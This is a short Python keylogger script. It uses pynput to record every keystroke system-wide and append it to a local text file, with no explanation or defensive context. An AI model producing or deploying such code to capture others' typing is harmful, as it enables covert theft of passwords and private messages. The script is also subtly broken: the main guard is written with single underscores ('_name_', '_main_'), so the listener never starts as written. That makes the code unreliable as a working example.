from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            # Handle special keys (e.g., space, enter, etc.)
            if key == keyboard.Key.space:
                logkey.write(' ')
            elif key == keyboard.Key.enter:
                logkey.write('\n')
            else:
                logkey.write(f'[{key}]')

if _name_ == "_main_":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
    input()